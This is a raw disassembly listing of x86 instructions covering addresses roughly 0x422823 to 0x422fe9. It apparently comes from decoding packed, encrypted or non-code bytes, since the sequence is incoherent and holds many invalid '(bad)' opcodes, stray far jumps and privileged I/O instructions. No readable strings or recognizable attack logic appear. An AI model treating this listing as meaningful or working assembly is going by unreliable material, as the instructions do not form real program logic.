  422823:	dec    edi
  422824:	ins    BYTE PTR es:[edi],dx
  422825:	inc    ebp
  422826:	push   ss
  422827:	push   ss
  422828:	jne    0x4227c8
  42282a:	lods   eax,DWORD PTR ds:[esi]
  42282b:	lods   eax,DWORD PTR ds:[esi]
  42282c:	push   es
  42282d:	das    
  42282e:	ja     0x42281c
  422830:	pop    esp
  422831:	idiv   DWORD PTR [ecx]
  422833:	mov    eax,ds:0xe919d61a
  422838:	pushfw 
  42283a:	push   ebp
  42283b:	mov    bh,0xe5
  42283d:	xor    DWORD PTR [edi-0x1f244920],0xfb1c3fd1
  422847:	cmp    ebp,DWORD PTR [ecx]
  422849:	inc    eax
  42284a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42284b:	xchg   ebx,eax
  42284c:	hlt    
  42284d:	pop    ebp
  42284e:	mov    edi,DWORD PTR [ebx+0x714fa35b]
  422854:	pop    es
  422855:	neg    DWORD PTR [ecx+0x65d7a71f]
  42285b:	mov    ds:0xcc083bfd,al
  422860:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422861:	and    ch,BYTE PTR [edi]
  422863:	mov    ah,0x5a
  422865:	dec    ebp
  422866:	push   ds
  422867:	and    al,0x28
  422869:	and    dl,bh
  42286b:	lahf   
  42286c:	xchg   esp,eax
  42286d:	adc    al,0xae
  42286f:	push   ebx
  422870:	cs jb  0x422807
  422873:	sub    ebp,DWORD PTR [eax-0x14]
  422876:	push   esi
  422877:	jp     0x422888
  422879:	cmp    ebp,DWORD PTR [esi+ebx*1-0x2bdd6fa9]
  422880:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  422882:	fisub  DWORD PTR [eax+0x178e9495]
  422888:	rcl    BYTE PTR [edi-0x6d],0x44
  42288c:	push   0x23
  42288e:	jge    0x4228ff
  422890:	sbb    eax,0xf165e8e9
  422895:	mov    WORD PTR [edi],?
  422897:	fist   DWORD PTR [eax-0x1a]
  42289a:	xchg   ebx,ecx
  42289c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42289d:	adc    eax,0xed295cce
  4228a2:	push   bp
  4228a4:	mov    ds:0x56c00101,eax
  4228a9:	pop    eax
  4228aa:	test   dh,ah
  4228ac:	test   ch,bl
  4228ae:	lods   al,BYTE PTR ds:[esi]
  4228af:	cmc    
  4228b0:	mov    dh,0xe
  4228b2:	cld    
  4228b3:	iret   
  4228b4:	in     eax,dx
  4228b5:	push   esp
  4228b6:	push   0xffffffed
  4228b8:	movups xmm5,XMMWORD PTR [ecx-0x4b9530c9]
  4228bf:	(bad)  
  4228c1:	cmp    ch,BYTE PTR [ebx]
  4228c3:	fs cld 
  4228c5:	mov    esi,0x9294f40d
  4228ca:	(bad)  
  4228cb:	pop    eax
  4228cc:	inc    eax
  4228cd:	adc    BYTE PTR [ebx],al
  4228cf:	mov    bl,0xe3
  4228d1:	cmp    eax,0xea913aa0
  4228d6:	mov    ch,0x7
  4228d8:	stc    
  4228d9:	in     eax,dx
  4228da:	ret    0x8e26
  4228dd:	pop    eax
  4228de:	scas   al,BYTE PTR es:[edi]
  4228df:	push   ebp
  4228e0:	pop    edi
  4228e1:	das    
  4228e2:	fidiv  WORD PTR [ecx+eax*8-0x1d]
  4228e6:	ret    
  4228e7:	in     eax,dx
  4228e8:	test   DWORD PTR [edi-0x1a1dc14c],0xd395ec24
  4228f2:	xor    eax,0x71ca243d
  4228f7:	not    BYTE PTR [ebx-0x61]
  4228fa:	jg     0x422978
  4228fc:	popa   
  4228fd:	(bad)  
  4228fe:	stos   BYTE PTR es:[edi],al
  4228ff:	jo     0x422939
  422901:	ins    DWORD PTR es:[edi],dx
  422902:	jae    0x422971
  422904:	jo     0x42295d
  422906:	fmulp  st(3),st
  422908:	dec    esi
  422909:	adc    edi,DWORD PTR [ebx+0x42]
  42290c:	test   ebx,ecx
  42290e:	push   edi
  42290f:	pop    ebp
  422910:	pop    ss
  422911:	mov    dh,0x56
  422913:	mov    ah,BYTE PTR [eax+0x6b]
  422916:	add    bl,BYTE PTR [ebp+0x28]
  422919:	lahf   
  42291a:	mov    edx,DWORD PTR [ebx-0x4c]
  42291d:	rcr    BYTE PTR [edi+0x21],cl
  422920:	rcl    DWORD PTR [ebx],1
  422922:	mov    al,0xe9
  422924:	shr    BYTE PTR [esi-0x1300dd97],cl
  42292a:	jmp    0xd70268fe
  42292f:	les    esi,FWORD PTR [edi]
  422931:	cmc    
  422932:	clc    
  422933:	jl     0x4229a4
  422935:	mov    ss,edi
  422937:	(bad)  
  422938:	cmc    
  422939:	in     eax,0x44
  42293b:	dec    esi
  42293c:	ins    BYTE PTR es:[edi],dx
  42293d:	(bad)  
  42293e:	out    0xc2,eax
  422940:	push   es
  422941:	enter  0x8203,0xec
  422945:	pusha  
  422946:	and    esi,edx
  422948:	in     al,0xc
  42294a:	scas   eax,DWORD PTR es:[edi]
  42294b:	aad    0x89
  42294d:	dec    ebp
  42294e:	push   esi
  42294f:	dec    esi
  422950:	shr    BYTE PTR [edx+0x7ca1a597],cl
  422956:	lahf   
  422957:	mov    edx,0xaa7e8b32
  42295c:	idiv   bh
  42295e:	mov    esi,0xb0548ee3
  422963:	call   0x100:0x3a79fe2a
  42296a:	call   0x9f3f40a7
  42296f:	jnp    0x4228f1
  422971:	fmul   QWORD PTR [ebx]
  422973:	xchg   edi,eax
  422974:	fstp   QWORD PTR [ecx]
  422976:	add    eax,0xe0317d4b
  42297b:	push   eax
  42297c:	cmp    al,0x62
  42297e:	mov    DWORD PTR [edx-0x28],esp
  422981:	stos   DWORD PTR es:[edi],eax
  422982:	push   esp
  422983:	sub    BYTE PTR [eax+0x45532bda],dl
  422989:	nop
  42298a:	push   eax
  42298b:	test   eax,0x8f78997d
  422990:	and    eax,0xe4337ed1
  422995:	mov    ds:0xe783d040,eax
  42299a:	mov    ds:0xed0efd07,al
  42299f:	jno    0x422947
  4229a1:	aas    
  4229a2:	das    
  4229a3:	xchg   ebx,eax
  4229a4:	rol    DWORD PTR [eax],0x87
  4229a7:	fbstp  TBYTE PTR [esi-0x78]
  4229aa:	lds    esp,FWORD PTR [edx+ecx*1-0x6392ad57]
  4229b1:	ja     0x422a01
  4229b3:	jae    0x422995
  4229b5:	cmp    al,0xcc
  4229b7:	push   cs
  4229b8:	push   esi
  4229b9:	push   0x1f609fb0
  4229be:	adc    dl,ch
  4229c0:	mov    cl,0x5c
  4229c2:	push   cs
  4229c3:	inc    ecx
  4229c4:	popf   
  4229c5:	sub    DWORD PTR [eax+ecx*4],edi
  4229c8:	push   edi
  4229c9:	mov    ch,0xf9
  4229cb:	xchg   BYTE PTR [esi-0x4527f97b],cl
  4229d1:	push   cs
  4229d2:	shr    ch,cl
  4229d4:	or     eax,0x62b7eae3
  4229d9:	das    
  4229da:	cs leave 
  4229dc:	inc    eax
  4229dd:	mov    esi,0x3ebfa890
  4229e2:	test   BYTE PTR [edi],bl
  4229e4:	test   esp,esp
  4229e6:	in     al,0xe8
  4229e8:	cld    
  4229e9:	inc    esp
  4229ea:	xchg   esp,eax
  4229eb:	cmp    DWORD PTR [ecx+0x1e59bf06],esi
  4229f1:	pop    ss
  4229f2:	add    ch,al
  4229f4:	pop    edx
  4229f5:	rcl    DWORD PTR [esi-0x44eb120b],0xfd
  4229fc:	popa   
  4229fd:	lods   eax,DWORD PTR ds:[esi]
  4229fe:	shr    DWORD PTR [edx],1
  422a00:	mov    eax,ds:0xd2e1a40a
  422a05:	sbb    DWORD PTR [eax+0x546ac7ba],ebp
  422a0b:	xchg   edx,eax
  422a0c:	adc    ch,ch
  422a0e:	xchg   BYTE PTR [esi+0xe],ch
  422a11:	ror    ebp,cl
  422a13:	jno    0x4229fb
  422a15:	fimul  WORD PTR [ecx]
  422a17:	js     0x4229e5
  422a19:	mov    esi,0xcc51f046
  422a1e:	jb     0x422a82
  422a20:	jp     0x422a82
  422a22:	(bad)  
  422a23:	test   eax,0x296e7bc3
  422a28:	fnsave [esi+0x2ee54f0c]
  422a2e:	aaa    
  422a2f:	nop
  422a30:	jo     0x4229ee
  422a32:	jo     0x422a4a
  422a34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a35:	gs repnz mov ecx,0x66e97734
  422a3c:	pop    DWORD PTR [ecx-0x4bf5eb03]
  422a42:	push   ecx
  422a43:	sbb    al,0x4b
  422a45:	mov    bl,0x2e
  422a47:	loopne 0x422a5b
  422a49:	retf   
  422a4a:	cwde   
	...
  422a67:	add    BYTE PTR [eax],al
  422a69:	add    BYTE PTR [eax+0x50],cl
  422a6c:	push   eax
  422a6d:	dec    ebp
  422a6e:	pop    eax
  422a6f:	dec    ebp
  422a70:	pop    ebp
  422a71:	push   ebp
  422a72:	stos   DWORD PTR es:[edi],eax
  422a73:	mov    ch,0xf6
  422a75:	stc    
  422a76:	push   eax
  422a77:	cmc    
  422a78:	fpatan 
  422a7a:	and    DWORD PTR [eax+0x6890001],edi
  422a80:	add    BYTE PTR [eax],al
  422a82:	inc    ecx
  422a83:	dec    esp
  422a84:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  422a86:	push   esp
  422a87:	xchg   edi,eax
  422a88:	or     esi,DWORD PTR [esi]
  422a8a:	cmp    DWORD PTR [eax],ebx
  422a8c:	pop    ds
  422a8d:	adc    BYTE PTR [ecx+edx*8+0x1bfbdb9],dh
  422a94:	sbb    al,0xd5
  422a96:	xchg   ebx,eax
  422a97:	jno    0x422aa0
  422a99:	inc    edi
  422a9a:	nop
  422a9b:	das    
  422a9c:	ja     0x422b04
  422a9e:	cmc    
  422a9f:	scas   al,BYTE PTR es:[edi]
  422aa0:	js     0x422ab7
  422aa2:	jle    0x422acc
  422aa4:	pop    ecx
  422aa5:	mov    edx,0x2138f6ef
  422aaa:	dec    ebp
  422aab:	bound  eax,QWORD PTR [edx]
  422aad:	popa   
  422aae:	aaa    
  422aaf:	aam    0x7
  422ab1:	jp     0x422ab1
  422ab3:	ds mov ch,0x8b
  422ab6:	push   ebx
  422ab7:	adc    esi,ecx
  422ab9:	jp     0x422a45
  422abb:	scas   al,BYTE PTR es:[edi]
  422abc:	fcom   QWORD PTR [ebp+0x1e]
  422abf:	fistp  WORD PTR [esi]
  422ac1:	push   ds
  422ac2:	popf   
  422ac3:	dec    ecx
  422ac4:	cmp    DWORD PTR [eax-0x1e],esi
  422ac7:	enter  0x850d,0x17
  422acb:	scas   al,BYTE PTR es:[edi]
  422acc:	push   es
  422acd:	or     esi,DWORD PTR [edx-0x2800fc6b]
  422ad3:	add    al,0x6d
  422ad5:	adc    BYTE PTR [esi-0x153aa9eb],bl
  422adb:	push   ecx
  422adc:	mov    esi,0xd4b0eed0
  422ae1:	ins    DWORD PTR es:[edi],dx
  422ae2:	jb     0x422a93
  422ae4:	jbe    0x422aca
  422ae6:	and    dh,cl
  422ae8:	pop    ss
  422ae9:	dec    ebx
  422aea:	aaa    
  422aeb:	push   esi
  422aec:	and    BYTE PTR [esi+edi*4],bl
  422aef:	stos   DWORD PTR es:[edi],eax
  422af0:	add    eax,0x10fb539b
  422af5:	leave  
  422af6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422af7:	jno    0x422ab5
  422af9:	mul    BYTE PTR [ebp+0x1f]
  422afc:	ret    
  422afd:	rep stos BYTE PTR es:[edi],al
  422aff:	dec    edi
  422b00:	out    dx,al
  422b01:	aad    0xb2
  422b03:	das    
  422b04:	cmp    eax,0xa5ebc2a4
  422b09:	rcr    DWORD PTR [edi],1
  422b0b:	jne    0x422ad9
  422b0d:	add    bl,dl
  422b0f:	cwde   
  422b10:	push   ebx
  422b11:	adc    bl,BYTE PTR [esi-0x1]
  422b14:	mov    bl,0xdb
  422b16:	xchg   ebx,eax
  422b17:	or     edx,ebx
  422b19:	jge    0x422b12
  422b1b:	jecxz  0x422ae6
  422b1d:	and    edi,DWORD PTR [edi]
  422b1f:	mov    ebp,0x3ce0b48f
  422b24:	or     ebx,DWORD PTR [ecx+0x8]
  422b27:	and    al,0x9e
  422b29:	xchg   ebx,eax
  422b2a:	mov    dh,0x42
  422b2c:	xor    DWORD PTR [eax+0x12],0xffffff84
  422b30:	daa    
  422b31:	loop   0x422b9c
  422b33:	lods   al,BYTE PTR ds:[esi]
  422b34:	stos   BYTE PTR es:[edi],al
  422b35:	jecxz  0x422b79
  422b37:	inc    ecx
  422b38:	or     DWORD PTR [esi+0x13fed3ae],ebp
  422b3e:	cmp    al,0xdb
  422b40:	jno    0x422ace
  422b42:	xchg   BYTE PTR [ebp-0x5730f920],al
  422b48:	mov    al,0x3c
  422b4a:	mov    cl,0xf8
  422b4c:	lock aas 
  422b4e:	cmp    al,0x37
  422b50:	push   eax
  422b51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b52:	into   
  422b53:	or     bl,0x3a
  422b56:	sbb    DWORD PTR ss:[ebp+0x13],ebx
  422b5a:	add    DWORD PTR [eax],0x532c541d
  422b60:	fisttp DWORD PTR [ebx-0x3324004a]
  422b66:	add    eax,0xcc066b26
  422b6b:	jecxz  0x422bd5
  422b6d:	(bad)  
  422b6e:	in     eax,0x3d
  422b70:	push   edx
  422b71:	sahf   
  422b72:	stos   BYTE PTR es:[edi],al
  422b73:	fistp  QWORD PTR [eax-0x3b49a0a7]
  422b79:	sbb    DWORD PTR [eax+ebx*4-0x3d],ecx
  422b7d:	push   es
  422b7e:	push   edx
  422b7f:	jno    0x422b21
  422b81:	push   edx
  422b82:	scas   eax,DWORD PTR es:[edi]
  422b83:	cld    
  422b84:	add    BYTE PTR [esi+0x1e],ah
  422b87:	fisttp QWORD PTR [eax]
  422b89:	xchg   esp,eax
  422b8a:	ret    
  422b8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b8c:	or     eax,0xe0c859a4
  422b91:	sub    BYTE PTR [edx+0x36],bh
  422b94:	popf   
  422b95:	lahf   
  422b96:	cli    
  422b97:	and    ecx,DWORD PTR [ebx-0x39]
  422b9a:	(bad)  
  422b9c:	(bad)
  422b9f:	inc    ecx
  422ba0:	ja     0x422b80
  422ba2:	push   0x7b
  422ba4:	je     0x422b9e
  422ba6:	loopne 0x422b59
  422ba8:	xchg   edi,eax
  422ba9:	inc    edi
  422baa:	push   0xffffffb2
  422bac:	jo     0x422b56
  422bae:	push   eax
  422baf:	pop    ecx
  422bb0:	sub    cl,BYTE PTR [eax+esi*8-0x79fbd461]
  422bb7:	(bad)  
  422bb8:	in     al,dx
  422bb9:	ds call 0x6c7581cb
  422bbf:	push   esp
  422bc0:	mov    esi,0x154da64e
  422bc5:	daa    
  422bc6:	push   edx
  422bc7:	push   edi
  422bc8:	pop    ss
  422bc9:	popa   
  422bca:	mov    ebp,0x43474854
  422bcf:	popf   
  422bd0:	sub    BYTE PTR [ebx],ah
  422bd2:	adc    eax,0x8488a5ec
  422bd7:	retf   0xd612
  422bda:	add    cl,BYTE PTR [ebx-0x1721f403]
  422be0:	retf   
  422be1:	xchg   ecx,eax
  422be2:	test   al,0x2c
  422be4:	sbb    BYTE PTR [edi],bl
  422be6:	adc    DWORD PTR [edx],esp
  422be8:	mov    esp,edx
  422bea:	sub    eax,0x9869d9c4
  422bef:	inc    ebx
  422bf0:	ins    BYTE PTR es:[edi],dx
  422bf1:	stos   BYTE PTR es:[edi],al
  422bf2:	cs int3 
  422bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bf5:	or     DWORD PTR [ebp-0x2516589b],esp
  422bfb:	inc    ecx
  422bfc:	mov    ds:0xc4fc616e,al
  422c01:	emms   
  422c03:	out    0x8e,al
  422c05:	add    bh,BYTE PTR [edi-0x3684799]
  422c0b:	inc    esi
  422c0c:	jb     0x422bb4
  422c0e:	and    dl,0xd2
  422c11:	jbe    0x422bae
  422c13:	sub    ch,al
  422c15:	inc    edi
  422c16:	jae    0x422bfe
  422c18:	int3   
  422c19:	push   DWORD PTR [edx]
  422c1b:	out    0x32,al
  422c1d:	in     al,dx
  422c1e:	jle    0x422bd5
  422c20:	add    dh,BYTE PTR [eax-0x38]
  422c23:	jb     0x422c1c
  422c25:	xor    al,0x1a
  422c27:	pop    edx
  422c28:	pop    ss
  422c29:	sti    
  422c2a:	pop    es
  422c2b:	adc    al,0x90
  422c2d:	in     eax,0xfb
  422c2f:	add    eax,0x769085d8
  422c34:	int3   
  422c35:	call   0x3e3f5130
  422c3a:	mov    ebp,0x40293f14
  422c3f:	jge    0x422bed
  422c41:	iret   
  422c42:	mov    dl,0xda
  422c44:	or     bl,dh
  422c46:	cli    
  422c47:	fdivr  DWORD PTR [ecx-0x440fee9]
  422c4d:	mov    cl,0x2d
  422c4f:	cmp    DWORD PTR [edx+0x681c1c2],esp
  422c55:	push   edx
  422c56:	pop    es
  422c57:	sub    eax,0xca5b5f92
  422c5c:	call   0xe7c7e07d
  422c61:	dec    ebx
  422c62:	hlt    
  422c63:	int    0x73
  422c65:	dec    esp
  422c66:	call   0x3613:0xc7b8b611
  422c6d:	test   ebp,esi
  422c6f:	pop    esi
  422c70:	pop    ds
  422c71:	pop    eax
  422c72:	call   0xeaea4d04
  422c77:	stos   DWORD PTR es:[edi],eax
  422c78:	adc    eax,0x92401f6a
  422c7d:	minps  xmm1,XMMWORD PTR [edi-0x2d]
  422c81:	dec    esi
  422c82:	mov    dh,BYTE PTR [edx-0x1c]
  422c85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c86:	data16 fucomi st,st(1)
  422c89:	xchg   edi,eax
  422c8a:	cdq    
  422c8b:	lock in al,0x82
  422c8e:	xor    eax,0xf725f654
  422c93:	push   0xffffffe1
  422c95:	jmp    0x9028:0xeabb2343
  422c9c:	lds    esi,FWORD PTR [edx+0x7c]
  422c9f:	push   DWORD PTR [ebp-0x1842f7a9]
  422ca5:	(bad)  
  422ca6:	jmp    0x422c96
  422ca8:	popf   
  422ca9:	sahf   
  422caa:	(bad)
  422cad:	stos   BYTE PTR es:[edi],al
  422cae:	nop
  422caf:	mov    esi,0xb2c10ca7
  422cb4:	ficomp DWORD PTR [edi-0x63]
  422cb7:	in     eax,0xed
  422cb9:	cli    
  422cba:	pop    eax
  422cbb:	xor    eax,esi
  422cbd:	sbb    DWORD PTR [ecx+0x4e],eax
  422cc0:	pop    eax
  422cc1:	adc    cl,ch
  422cc3:	dec    esp
  422cc4:	stc    
  422cc5:	inc    ebx
  422cc6:	xchg   ebp,eax
  422cc7:	inc    edx
  422cc8:	fdiv   QWORD PTR [edi+0x5a3129b4]
  422cce:	mov    ecx,0x3e693338
  422cd3:	mov    eax,0xbe006764
  422cd8:	popa   
  422cd9:	pop    edx
  422cda:	rol    edx,cl
  422cdc:	ds cmp al,0xd
  422cdf:	mov    ds:0x39e42c1a,al
  422ce4:	jno    0x422c98
  422ce6:	ret    
  422ce7:	push   cs
  422ce8:	arpl   WORD PTR [ebx-0x375c668b],di
  422cee:	mov    cl,BYTE PTR [ecx+0x408e404e]
  422cf4:	push   ebx
  422cf5:	fcom   DWORD PTR [edx-0x7aa27502]
  422cfb:	mov    al,ds:0x1264b5ed
  422d00:	jecxz  0x422cec
  422d02:	fs jg  0x422d59
  422d05:	xor    eax,0xa2ccf256
  422d0a:	shr    DWORD PTR ds:0xa797e481,1
  422d10:	jns    0x422ca2
  422d12:	inc    edi
  422d13:	inc    ebx
  422d14:	imul   bh
  422d16:	repnz sbb eax,0x6f57e988
  422d1c:	dec    ecx
  422d1d:	pushf  
  422d1e:	mov    BYTE PTR [eax],al
  422d20:	in     al,dx
  422d21:	and    edi,DWORD PTR [edi+0x40]
  422d24:	sub    eax,0x5ed4c654
  422d29:	pop    ds
  422d2a:	mov    edx,0x9c7885b2
  422d2f:	in     al,0x9
  422d31:	mov    ebp,0xa31b8b0c
  422d36:	das    
  422d37:	jnp    0x422d02
  422d39:	mov    ecx,ebx
  422d3b:	mov    ebx,DWORD PTR [esi+0x5e40f389]
  422d41:	cli    
  422d42:	jae    0x422db9
  422d44:	adc    dh,bl
  422d46:	jno    0x422d71
  422d48:	loop   0x422d7f
  422d4a:	and    DWORD PTR [eax-0x59],ecx
  422d4d:	(bad)  
  422d4e:	and    edi,esp
  422d50:	dec    esi
  422d51:	adc    bh,ch
  422d53:	cmp    BYTE PTR [ecx+0x6d5ee412],cl
  422d59:	test   BYTE PTR [ebp+0x1e],dl
  422d5c:	push   ebx
  422d5d:	or     eax,0x6b435227
  422d62:	popa   
  422d63:	mov    al,0xf5
  422d65:	mov    ecx,0x90363894
  422d6a:	adc    eax,0xb629f371
  422d6f:	jbe    0x422da1
  422d71:	ret    
  422d72:	sti    
  422d73:	imul   DWORD PTR [edx-0x71]
  422d76:	es mov edi,0x3210dff0
  422d7c:	or     al,0x2
  422d7e:	sub    BYTE PTR [ebp+eiz*1+0x64],al
  422d82:	sbb    BYTE PTR [ecx],ch
  422d84:	mov    ebx,0xac918290
  422d89:	cs inc ebp
  422d8b:	data16 jns 0x422dfa
  422d8e:	dec    esi
  422d8f:	cld    
  422d90:	mov    esi,0xa3c64d6
  422d95:	loope  0x422d66
  422d97:	mov    ecx,0x1efa94a1
  422d9c:	jge    0x422e17
  422d9e:	xor    BYTE PTR [edi+0x2e4e95fb],dh
  422da4:	mov    edi,0x586c1361
  422da9:	inc    edx
  422daa:	rcr    BYTE PTR [eax+0x25],cl
  422dad:	add    eax,0xc988e718
  422db2:	sub    al,0xf
  422db4:	inc    edx
  422db5:	push   edi
  422db6:	ja     0x422de0
  422db8:	mov    BYTE PTR [esi],ah
  422dba:	fmul   QWORD PTR [ebx+0x79]
  422dbd:	jne    0x422d9d
  422dbf:	jb     0x422e27
  422dc1:	fadd   QWORD PTR [eax-0xe]
  422dc4:	loopne 0x422d7c
  422dc6:	ins    BYTE PTR es:[edi],dx
  422dc7:	retf   
  422dc8:	dec    edx
  422dc9:	adc    BYTE PTR [ebx-0x1b],dh
  422dcc:	pop    es
  422dcd:	cwde   
  422dce:	inc    eax
  422dcf:	aas    
  422dd0:	mov    esp,0xe580ca07
  422dd5:	mov    ds:0x56c4d348,al
  422dda:	adc    BYTE PTR [edx+0x9c157fe],cl
  422de0:	mov    eax,ds:0x40ec0ef5
  422de5:	pop    edx
  422de6:	rol    DWORD PTR [ebp-0x3f],1
  422de9:	sub    eax,0x91f8b868
  422dee:	stos   BYTE PTR es:[edi],al
  422def:	pop    eax
  422df0:	pop    edi
  422df1:	dec    eax
  422df2:	adc    al,0xf0
  422df4:	add    DWORD PTR [ecx+0x3579960f],ebx
  422dfa:	pop    ebp
  422dfb:	jne    0x422db7
  422dfd:	in     eax,dx
  422dfe:	mov    BYTE PTR [edi+0x7b],cl
  422e01:	fs mov ebx,0x8d72dc98
  422e07:	mov    BYTE PTR [ebx],dh
  422e09:	jg     0x422d8f
  422e0b:	fadd   DWORD PTR [edi-0x6d]
  422e0e:	mov    al,0xed
  422e10:	adc    eax,0xb4965b7
  422e15:	enter  0xa5d6,0x94
  422e19:	pop    ecx
  422e1a:	rcl    DWORD PTR [edi-0x226872c6],cl
  422e20:	pop    ebx
  422e21:	push   0xffffffcf
  422e23:	dec    edi
  422e24:	adc    BYTE PTR [edi-0x23b526d1],dh
  422e2a:	(bad)  
  422e2b:	icebp  
  422e2c:	sub    eax,0x67a664fa
  422e31:	dec    edi
  422e32:	inc    ebp
  422e33:	push   edx
  422e34:	cmp    bh,BYTE PTR [ebx-0x1bad2d03]
  422e3a:	push   ss
  422e3b:	sub    BYTE PTR [ecx],bl
  422e3d:	addr16 mov ds:0xe092,al
  422e41:	xor    bl,BYTE PTR [ebx]
  422e43:	or     bl,BYTE PTR [eax-0x61]
  422e46:	fmulp  st(0),st
  422e48:	and    al,0xb3
  422e4a:	or     BYTE PTR [eax-0x22ef025e],bl
  422e50:	pop    ebx
  422e51:	push   edi
  422e52:	mov    ds:0x15c919a4,al
  422e57:	ins    DWORD PTR es:[edi],dx
  422e58:	int3   
  422e59:	adc    DWORD PTR [eax-0x2922437a],0x4c
  422e60:	sbb    eax,0x239f39fd
  422e65:	out    dx,eax
  422e66:	mov    ecx,0xac0f36f8
  422e6b:	jno    0x422ea7
  422e6d:	loop   0x422ee5
  422e6f:	pop    esi
  422e70:	adc    BYTE PTR [ecx-0x1d],cl
  422e73:	rol    DWORD PTR [ecx+ecx*1-0x2a],cl
  422e77:	ss aam 0x9b
  422e7a:	data16 or al,0x51
  422e7d:	outs   dx,DWORD PTR ds:[esi]
  422e7e:	aaa    
  422e7f:	in     eax,0x16
  422e81:	fsubrp st(4),st
  422e83:	mov    ds:0x77e73865,al
  422e88:	stos   DWORD PTR es:[edi],eax
  422e89:	hlt    
  422e8a:	sub    edx,DWORD PTR [ecx+0xb]
  422e8d:	movntq QWORD PTR [ebx+edx*2],mm2
  422e91:	lahf   
  422e92:	dec    ebp
  422e93:	cli    
  422e94:	xor    al,0xd2
  422e96:	and    BYTE PTR [ebx-0x7b2a6db9],ah
  422e9c:	int    0x67
  422e9e:	popf   
  422e9f:	pop    ecx
  422ea0:	popa   
  422ea1:	sbb    al,0x26
  422ea3:	pop    es
  422ea4:	xchg   ebp,eax
  422ea5:	xchg   edx,eax
  422ea6:	jg     0x422e67
  422ea8:	pushf  
  422ea9:	mov    eax,0x632488fb
  422eae:	fild   DWORD PTR [ebp+0x3]
  422eb1:	dec    ebx
  422eb2:	dec    ebx
  422eb3:	rcr    DWORD PTR [eax+0x68d215ba],1
  422eb9:	sub    eax,0xa8fb42d1
  422ebe:	pop    ebp
  422ebf:	gs aad 0x28
  422ec2:	inc    edx
  422ec3:	mov    ds:0xfe5cd56d,eax
  422ec8:	jle    0x422f09
  422eca:	arpl   WORD PTR [esi-0x15],di
  422ecd:	push   esp
  422ece:	push   ebp
  422ecf:	je     0x422e98
  422ed1:	sbb    eax,0x8d5b7341
  422ed6:	rcr    esi,0x8c
  422ed9:	push   0x95d5b20
  422ede:	(bad)  
  422edf:	cld    
  422ee0:	inc    eax
  422ee1:	ja     0x422f51
  422ee3:	scas   al,BYTE PTR es:[edi]
  422ee4:	cwde   
  422ee5:	cmp    al,0x6b
  422ee7:	push   edi
  422ee8:	jns    0x422eb7
  422eea:	cs sbb al,0x9
  422eed:	or     eax,0xae95777d
  422ef2:	adc    BYTE PTR [edx],ah
  422ef4:	dec    esp
  422ef5:	adc    eax,edx
  422ef7:	es or  al,0xcb
  422efa:	ds inc ebx
  422efc:	mov    ch,0x12
  422efe:	mov    al,0xf7
  422f00:	cmc    
  422f01:	mov    ds:0x19496217,eax
  422f06:	cmp    BYTE PTR [eax+0x6cb96c7d],cl
  422f0c:	xor    dl,al
  422f0e:	out    0xa3,al
  422f10:	mov    esi,DWORD PTR [edi+0x3e8eb943]
  422f16:	cmp    esp,esi
  422f18:	lea    eax,[esi+0x64]
  422f1b:	(bad)  
  422f1c:	jns    0x422f91
  422f1e:	pop    ebp
  422f1f:	ds cdq 
  422f21:	sar    DWORD PTR [edx-0x2e9a9bda],cl
  422f27:	pop    ss
  422f28:	lock pop ebx
  422f2a:	lea    eax,[ebp+0x59cfd90c]
  422f30:	retf   0x8ff7
  422f33:	in     al,0xbf
  422f35:	stc    
  422f36:	std    
  422f37:	sbb    DWORD PTR [eax],edx
  422f39:	stc    
  422f3a:	in     al,0x61
  422f3c:	and    bh,ch
  422f3e:	fist   WORD PTR [edi]
  422f40:	adc    al,0xf4
  422f42:	test   bh,bh
  422f44:	(bad)  
  422f45:	iret   
  422f46:	jnp    0x422f27
  422f48:	ret    
  422f49:	jmp    0xe8ff:0x435bf4f4
  422f50:	cmp    DWORD PTR [edi-0x23361f79],esi
  422f56:	(bad)  
  422f57:	in     eax,dx
  422f58:	mov    ah,BYTE PTR [esi+0x24df4fe2]
  422f5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f5f:	fldcw  WORD PTR [ecx+0x47]
  422f62:	adc    eax,0xd608aba7
  422f67:	das    
  422f68:	inc    esi
  422f69:	addr16 popf 
  422f6b:	sub    al,0x62
  422f6d:	add    DWORD PTR [esi],0xa5924318
  422f73:	xchg   edx,eax
  422f74:	dec    BYTE PTR cs:[esi-0x35]
  422f78:	loope  0x422f54
  422f7a:	cmc    
  422f7b:	dec    edi
  422f7c:	pushf  
  422f7d:	xor    BYTE PTR [eax+0x51],dl
  422f80:	ss xchg esp,eax
  422f82:	dec    edi
  422f83:	inc    ebp
  422f84:	sub    BYTE PTR [eax+esi*1-0x596ca938],cl
  422f8b:	test   DWORD PTR [esi+0x64644281],edx
  422f91:	cli    
  422f92:	mov    gs,WORD PTR [ecx-0x57]
  422f95:	mov    ds:0x14f6f3da,eax
  422f9a:	shl    BYTE PTR [esi+0x10ceb59a],cl
  422fa0:	mov    ds:0x949ad4a1,eax
  422fa5:	sub    esi,DWORD PTR [ebp-0x79]
  422fa8:	and    dl,BYTE PTR [edi-0x15]
  422fab:	outs   dx,BYTE PTR ds:[esi]
  422fac:	ret    0x4abf
  422faf:	leave  
  422fb0:	mov    bh,0xa4
  422fb2:	cmp    edi,DWORD PTR [ecx-0x257d3f41]
  422fb8:	cmp    eax,DWORD PTR [eax-0x69720f1e]
  422fbe:	jmp    0xe79f:0x6cbeea1f
  422fc5:	push   edi
  422fc6:	jmp    0x422fc0
  422fc8:	cmp    DWORD PTR [ebp+0x55e766e5],esp
  422fce:	adc    DWORD PTR [esi-0x31],ecx
  422fd1:	mov    ebx,0x7c712b1b
  422fd6:	int    0x7
  422fd8:	sub    esi,eax
  422fda:	add    DWORD PTR ds:0xc9f5857a,ecx
  422fe0:	clc    
  422fe1:	push   ebx
  422fe2:	pop    eax
  422fe3:	xor    DWORD PTR [ebx-0x4d22a35],edi
  422fe9:	lock mov al,ds:0x25c33f8
